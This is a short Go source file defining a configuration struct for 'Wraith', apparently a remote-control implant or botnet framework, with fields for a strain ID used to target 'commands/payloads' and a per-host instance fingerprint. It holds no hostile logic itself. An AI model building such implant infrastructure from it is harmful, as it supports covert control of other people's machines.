package libwraith

// A struct providing configuration options for Wraith to allow
// for altering behaviour without altering the code.
type Config struct {
	// A string representing the family ID or strain ID of Wraith.
	// This can be useful to check what different versions of
	// Wraith are out there, or to target only one specific
	// family with commands/payloads. This should be changed
	// whenever a significant change is made to Wraith before building.
	FamilyId string

	// A function used to generate the fingerprint for this instance
	// of Wraith. That is, a unique string matching specifically this
	// binary, on this host, in this process. It can be a UUID, for
	// instance, meaning that it serves only the purpose of identifiaction
	// and changes on every Wraith restart, or a string based on some
	// information such as MAC Address+Wraith PID.
	FingerprintGenerator func() string
}
